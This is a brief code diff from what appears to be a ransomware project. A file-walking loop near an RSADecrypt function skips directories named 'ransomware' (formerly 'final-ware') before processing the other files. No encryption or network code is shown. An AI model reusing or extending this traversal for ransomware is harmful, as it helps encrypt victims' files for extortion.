@@ -16,7 +16,7 @@ def RSADecrypt(plaintext):
     ) 
 
 for current_directory, sub_directories, sub_files in os.walk(OUTSIDE_DIRECTORY):
-    if 'final-ware' in current_directory.lower():
+    if 'ransomware' in current_directory.lower():
         continue
 
     for file in sub_files:
